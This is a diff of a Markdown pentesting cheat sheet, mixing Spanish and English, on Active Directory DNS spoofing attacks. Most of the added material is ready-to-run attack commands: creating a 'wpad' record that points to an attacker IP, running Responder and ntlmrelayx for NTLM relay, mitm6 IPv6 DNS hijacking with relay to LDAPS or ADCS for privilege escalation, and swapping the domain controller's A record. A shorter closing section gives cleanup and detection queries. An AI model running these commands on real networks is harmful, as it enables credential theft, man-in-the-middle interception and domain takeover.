@@ -25,46 +25,31 @@ linked:
 
 ## DNS Insecure Dynamic Update
 
-| **Vector** | **Cómo** | **Notas** |
+| **Comando** | **Qué hace / detecta** | **Cuándo** |
 |:---:|:---:|:---:|
-| Insecure DDNS enabled | Anyone can update records | Critical misconfig. |
-| `nsupdate` tool | Linux DDNS client | Standard. |
-| Add A record sin auth | If insecure DDNS | Trivial. |
-| Modify existing A record | Same | Same. |
-| Add CNAME record | Aliasing target | Edge. |
-| TXT record SPF/DKIM injection | Email spoof combo | Edge. |
-| Replace existing record | Overwrite legit entry | Spoofing. |
-| Removal (delete) record | DOS via removal | Edge. |
-| Atacante machine account = update creator | Default ownership | Detection clue. |
-| Detection: Event 5137 (DNS create) | Defender event | Adjacent. |
-| Secure DDNS = Kerberos auth required | GSS-TSIG | Modern default. |
-| Mixed mode (secure + insecure) | Common legacy gap | Vulnerable. |
-| Per-zone setting | Different policies | Granular. |
-| Reverse zones often less secure | Common oversight | Edge. |
-| Fix: enforce secure DDNS only | Hardening | Defense. |
-| Audit: scavenge + monitor adds | Standard | Defense. |
+| `nsupdate` interactive | Cliente DDNS Linux | Test insecure DDNS. |
+| `Get-DnsServerZone -ComputerName <DC> \| ? DynamicUpdate -eq "NonsecureAndSecure"` | Zonas con DDNS insecure | Audit defender. |
+| `Get-DnsServerZone -ComputerName <DC> \| ? DynamicUpdate -eq "Secure"` | Solo secure DDNS (Kerberos) | Hardened. |
+| Event ID 5137 | Log de creación de objeto en `dnsZone` | Detection signal. |
 ^ad-spoof-ddns
 
-### Insecure DDNS test
-
 ```bash
-# Check if DDNS allows insecure updates
+# Test si DDNS insecure permite create sin auth
 nsupdate <<EOF
-server DC
-zone dom.local.
-update add testrecord.dom.local. 60 A 1.2.3.4
+server <DC>
+zone corp.local.
+update add testrecord.corp.local. 60 A 1.2.3.4
 send
 EOF
 
-# Verify creation
-dig +short A testrecord.dom.local @DC
+# Verify
+dig +short A testrecord.corp.local @<DC>
 
-# If created → insecure DDNS = vulnerable
 # Cleanup
 nsupdate <<EOF
-server DC
-zone dom.local.
-update delete testrecord.dom.local. A
+server <DC>
+zone corp.local.
+update delete testrecord.corp.local. A
 send
 EOF
 ```
@@ -73,163 +58,115 @@ ___
 
 ## WPAD Attack
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| WPAD = Web Proxy Auto-Discovery | Browser auto-detects proxy | RFC 1948. |
-| Default browser behavior | Query `wpad.<dom>` for `wpad.dat` | Default. |
-| Attack: create wpad A record → attacker | Browser uses attacker proxy | MitM. |
-| `wpad.dat` content | JS PAC file | Defines proxy. |
-| Attack chain: WPAD → proxy → relay/sniff/inject | Multi-step | Comprehensive. |
-| Modern browser blocks if WPAD via DHCP | DHCPv4 option 252 | Default modern. |
-| WPAD via DNS still works | DNS-based discovery | Common vector. |
-| LLMNR fallback if no WPAD record | Combo | Adjacent. |
-| Default Authenticated Users can create | Common vulnerability | Critical default. |
-| `wpad` blocked in some Windows versions (post-MS16-077) | Defense | Adjacent. |
-| Edge.exe / Chrome / Firefox WPAD support | Differs per browser | Variable. |
-| Internet Explorer respects WPAD | Default | Standard. |
-| Modern Windows registry block | Group Policy | Defense. |
-| Mobile: typically ignores WPAD | Defense | Edge. |
-| Captive portal combo | Public WiFi + WPAD | Edge. |
-| Detection: DNS audit on `wpad` queries | Defender | Adjacent. |
+| `dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>` | Crear A record `wpad.corp.local` → atacante | Browsers IE/Edge auto-config. |
+| `responder -I eth0 -wF -v` | Responder con WPAD server activo | Sirve `wpad.dat`. |
+| `ntlmrelayx.py -tf relay_targets.txt -smb2support` | Relay credenciales capturadas vía WPAD | Combo. |
+| `dig +short A wpad.corp.local @<DC>` | Verificar record creado | Pre/post check. |
 ^ad-spoof-wpad
 
-### WPAD attack chain
+**Cómo funciona:** Browsers IE/Edge buscan `wpad.<dom>` para auto-detectar proxy. A record `wpad` → attacker IP + servir `wpad.dat` con `FindProxyForURL` apuntando a attacker = MitM HTTP/HTTPS.
+
+**Default DACL** = `Authenticated Users` con `CreateChild` sobre la zone = **cualquier user del domain puede crear `wpad`**.
 
 ```bash
-# Step 1: Create wpad A record (using DNS write permission)
-python3 dnstool.py -u 'dom\user' -p pass -a add -r wpad -d ATTACKER_IP DC
+# Pipeline completo
+# 1. Crear record
+python3 dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>
 
-# Step 2: Setup attacker proxy + wpad.dat
-# Run Responder with WPAD support:
+# 2. Responder con WPAD
 responder -I eth0 -wF -v
 
-# Or custom HTTP server serving wpad.dat:
-cat > wpad.dat <<EOF
-function FindProxyForURL(url, host) {
-    return "PROXY ATTACKER_IP:8080";
-}
-EOF
+# 3. (paralelo) Relay a SMB sin signing
+ntlmrelayx.py -tf relay_targets.txt -smb2support
 
-# Step 3: Wait for browsers to auto-config → relay/sniff traffic
-# Combine with ntlmrelayx for SMB/HTTP relay
+# 4. Cleanup
+python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad <DC>
 ```
 
 ___
 
 ## mitm6 (IPv6 DHCP Spoofing)
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| Default Windows IPv6 enabled | Even on IPv4-only networks | Architecture. |
-| DHCPv6 preference IPv6 > IPv4 | Windows default | Critical. |
-| mitm6 spoofs DHCPv6 server | Atacante = DHCPv6 server | Standard. |
-| Atacante's IP = DNS server (IPv6) | Override DNS via IPv6 | Trick. |
-| All DNS queries → atacante | Selective DNS resolution | Powerful. |
-| Combine with WPAD attack | mitm6 + responder + relay | Standard chain. |
-| WPAD discovery via DNS → atacante answers | wpad.dom.local → ATTACKER_IPv6 | Combo. |
-| Browser uses attacker proxy | Auto-config | Win. |
-| Domain join requests → atacante | Privileged user logins | High-value. |
-| Combine with ntlmrelayx -6 | NTLM Relay over IPv6 | Standard. |
-| `mitm6 -d dom.local` | Filter target domain | Targeted. |
-| `mitm6 --ignore-nofqdn` | Ignore non-FQDN | Edge. |
-| Defense: disable IPv6 on hosts | Aggressive but effective | Defense. |
-| Defense: block DHCPv6 broadcasts | Network-level | Defense. |
-| Detection: rogue DHCPv6 server alerts | SIEM + network | Adjacent. |
-| Modern IPv6 defenses (RA Guard) | Switch-level | Defense. |
+| `mitm6 -d corp.local` | DHCPv6 spoofer + DNS hijack para domain target | IPv6 enabled (default Win). |
+| `mitm6 -d corp.local --ignore-nofqdn` | Ignorar non-FQDN queries | Reduce noise. |
+| `mitm6 -d corp.local --relay <attacker-IPv6>` | Forzar IP atacante específica | Custom routing. |
+| `ntlmrelayx.py -6 -t ldaps://<DC> --escalate-user <attacker> --no-smb-server -wh attacker.corp.local` | Relay over IPv6 a LDAP con privesc | Modern combo. |
+| `ntlmrelayx.py -6 -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController` | Relay a ADCS ESC8 | Cert-based privesc. |
 ^ad-spoof-mitm6
 
-### mitm6 + relay chain
+**Por qué funciona:** Windows tiene IPv6 enabled default + prefiere DHCPv6 sobre DHCPv4. mitm6 actúa como DHCPv6 server, asignando atacante como DNS server (IPv6). Todas las queries DNS pasan por atacante.
 
 ```bash
-# Terminal 1: mitm6 (DHCPv6 spoofing + DNS)
-mitm6 -d dom.local
+# Terminal 1: mitm6 spoofing
+mitm6 -d corp.local
 
-# Terminal 2: ntlmrelayx (relay to LDAP/SMB)
-ntlmrelayx.py -t ldaps://DC --escalate-user attacker_user --no-smb-server -wh attacker.dom.local
-
-# Or relay to ADCS for cert
-ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController
-
-# Wait for IPv6-enabled hosts to auth → relayed → privilege escalation
+# Terminal 2: NTLM Relay listener
+ntlmrelayx.py -6 -t ldaps://<DC> \
+  --escalate-user atacante \
+  --no-smb-server \
+  -wh attacker.corp.local
 ```
 
 ___
 
-## DNS Spoofing via Records Injection
+## DNS Records Injection (Spoofing Targeted)
 
-| **Vector** | **Target** | **Notas** |
+| **Comando** | **Spoof target** | **Impacto** |
 |:---:|:---:|:---:|
-| Replace `dc01.dom.local` A record | Auth queries → atacante | Critical. |
-| Replace `_ldap._tcp.dc._msdcs` SRV | Direct LDAP redirect | Edge. |
-| Replace `_kerberos._tcp` SRV | KDC redirect — Kerberos relay | Critical. |
-| Add fake DC SRV record | Multiple DCs — high priority | Subtle. |
-| Modify GC record | Forest queries → atacante | Edge. |
-| Spoof internal app records | redirect HR/finance/email | Targeted. |
-| Spoof MX record | Email interception | Mail combo. |
-| Spoof TXT SPF | Allow attacker email | Spoof combo. |
-| Spoof reverse PTR | False name resolution | Indirect. |
-| ISATAP / 6to4 record | IPv6 tunnel hijack | Edge. |
-| Conditional forwarder modification | Cross-zone redirect | Edge. |
-| Time-based record swap | Ephemeral spoofing | Stealth. |
-| TTL=1 records | Quick cache expiry | Manipulation. |
-| Negative caching abuse | Force re-query | Manipulation. |
-| Per-record ACL exploitation | Granular write permission | ACL combo. |
-| `Authenticated Users CreateChild` default | Most zones vulnerable | Default. |
+| `dnstool.py -a modify -r dc01 -d <attacker-IP> <DC>` | Reemplazar A record DC | Auth queries → atacante (loud). |
+| `dnstool.py -a add -r <hostname> -d <attacker-IP> <DC>` | Añadir A record nuevo | WPAD / fake apps. |
+| `dnstool.py -a add -r mail -d <attacker-IP> <DC>` | Spoof mail server | Email interception interna. |
+| Modificar SRV `_ldap._tcp.dc._msdcs` | Redirigir queries LDAP | Auth interception (rare, bien protegido). |
+| Modificar SRV `_kerberos._tcp` | Redirigir KDC | Kerberos relay (critical). |
+| `dnstool.py -a add -r isatap -d <attacker-IP> <DC>` | ISATAP IPv6 tunnel | Tunnel hijack. |
 ^ad-spoof-records
 
-### Targeted spoof example
-
 ```bash
-# Replace DC IP with attacker (devastating but loud)
-python3 dnstool.py -u 'dom\user' -p pass -a remove -r dc01 DC
-python3 dnstool.py -u 'dom\user' -p pass -a add -r dc01 -d ATTACKER_IP DC
+# Spoof targeted: DC IP swap (devastating, loud — solo demo)
+ORIG_IP=$(dig +short A dc01.corp.local @<DC>)
 
-# Verify
-dig +short A dc01.dom.local @DC
+# Hijack
+python3 dnstool.py -u 'corp\u' -p pass -a remove -r dc01 <DC>
+python3 dnstool.py -u 'corp\u' -p pass -a add -r dc01 -d <attacker-IP> <DC>
 
-# Result: clients lookup dc01 → attacker IP → can sniff/relay/MitM auth
-# Restoration:
-python3 dnstool.py -u 'dom\user' -p pass -a remove -r dc01 DC
-python3 dnstool.py -u 'dom\user' -p pass -a add -r dc01 -d ORIGINAL_DC_IP DC
+# Restore (siempre)
+python3 dnstool.py -u 'corp\u' -p pass -a remove -r dc01 <DC>
+python3 dnstool.py -u 'corp\u' -p pass -a add -r dc01 -d "$ORIG_IP" <DC>
 ```
 
 ___
 
 ## Cleanup y Detection
 
-| **Acción** | **Cómo** | **Notas** |
+| **Comando** | **Para qué** | **Cuándo** |
 |:---:|:---:|:---:|
-| Restore original record | Use original IP/value backup | Standard. |
-| Remove malicious record | `dnstool -a remove` | Cleanup. |
-| Verify scavenging didn't leave tombstone | `--remove-tombstone` | Edge. |
-| Check DNS cache server-side | `dnscmd /clearcache` | Native. |
-| Client-side cache clear | `ipconfig /flushdns` | Per-host. |
-| Audit creation timestamp | `whenCreated` LDAP attribute | Timeline. |
-| Audit creator | `nTSecurityDescriptor` ownership | Forensic. |
-| DNS event log | Event ID 257 (DNS server) | Defender. |
-| AD audit logs | Event ID 5137 (object create) | Defender. |
-| Detection: scheduled DNS audit | Compare expected vs actual | Defense. |
-| Detection: alert on `wpad`/`isatap` queries | Common attack name | Defense. |
-| Detection: anomaly in dnsRecord modify rate | High volume = attack | Defense. |
-| BloodHound DNS analytics | Future custom edges | Adjacent. |
-| Microsoft Defender for Identity | DNS spoofing alerts | Defender. |
-| Sysmon DNS event ID 22 | Per-host DNS | Adjacent. |
-| Network DNS sniffing | Detect anomalous responses | Edge. |
+| `dnstool.py -a remove -r <name> <DC>` | Quitar record | Post-engagement. |
+| `dnstool.py -a remove -r <name> --remove-tombstone <DC>` | Purgar tombstone | Persistencia hunt. |
+| `dnscmd <DC> /clearcache` | Limpiar cache server-side | Verificar restoration. |
+| `ipconfig /flushdns` | Cache cliente | Per-host. |
+| `Get-ADObject -SearchBase "DC=DomainDnsZones,..." -Filter {whenChanged -gt (Get-Date).AddDays(-1)}` | Records modificados últimas 24h | Defender hunt. |
+| `(Get-ADObject "DC=<rec>,DC=<zone>,..." -Pr nTSecurityDescriptor).nTSecurityDescriptor.Owner` | Quien creó el record | Forensic attribution. |
+| Event ID 5137 | LDAP create en `dnsNode` | Detection alert. |
+| Event ID 257 (DNS server) | DNS server changes | Defender alert. |
 ^ad-spoof-cleanup
 
-### Audit recently changed records
-
 ```powershell
-# Records modified in last 24h
-Get-ADObject -SearchBase "DC=DomainDnsZones,DC=dom,DC=local" `
+# Hunt — records añadidos/modificados últimas 24h
+Get-ADObject -SearchBase "DC=DomainDnsZones,DC=corp,DC=local" `
   -Filter {whenChanged -gt (Get-Date).AddDays(-1)} `
-  -Properties whenChanged,whenCreated,name,distinguishedName |
+  -Properties whenChanged,whenCreated |
   Select Name,DistinguishedName,whenCreated,whenChanged |
   Sort whenChanged -Descending
 
-# Per-record creator (via nTSecurityDescriptor owner)
-$record = Get-ADObject "DC=test,DC=dom.local,DC=DomainDnsZones,DC=dom,DC=local" -Properties nTSecurityDescriptor
-$record.nTSecurityDescriptor.Owner
+# Records sospechosos hardcoded
+$Suspicious = Get-DnsServerResourceRecord -ZoneName corp.local -ComputerName <DC> |
+  Where { $_.HostName -in '*','wpad','isatap' -or $_.HostName -match '^_(kerberos|ldap)' }
+
+$Suspicious | Select RecordType,HostName,RecordData,Timestamp
 ```
 
 ***
